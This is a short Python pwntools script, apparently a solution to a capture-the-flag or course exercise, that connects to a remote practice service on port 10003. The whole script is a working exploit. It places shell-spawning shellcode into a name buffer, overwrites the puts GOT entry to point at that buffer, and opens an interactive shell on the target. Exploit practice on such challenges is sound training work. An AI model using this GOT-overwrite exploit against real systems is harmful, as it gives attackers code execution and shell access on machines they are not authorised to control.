#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

# init
c = remote('isc.taiwan-te.ch', 10003)

context.os='linux'
context.arch='amd64'


ans = asm(shellcraft.sh()) + 'A' * 16   # put shellcode to name
ans = ans + str(0x601018) + '\n'        # set to puts GOT
ans = ans + p64(0x601080) + '\n'        # point GOT to name
c.send(ans)

c.interactive()
c.close()
